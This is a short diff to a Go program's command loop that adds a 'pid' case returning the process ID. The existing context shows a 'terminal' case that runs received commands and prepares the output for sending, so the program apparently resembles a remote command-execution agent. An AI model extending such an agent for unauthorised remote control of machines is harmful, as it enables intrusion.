@@ -207,7 +207,11 @@ func main() {
 		case "terminal":
 			commandToRun := strings.Join(sb1, ",")
 			result = terminal(commandToRun)
+		case "pid":
+		    pid := os.Getpid()
+		    result = fmt.Sprint(pid)
 		}
+
 		toSend := string(result)
 		fmt.Printf(toSend)
 		toSend = strings.Replace(toSend, "\n", "", -1)
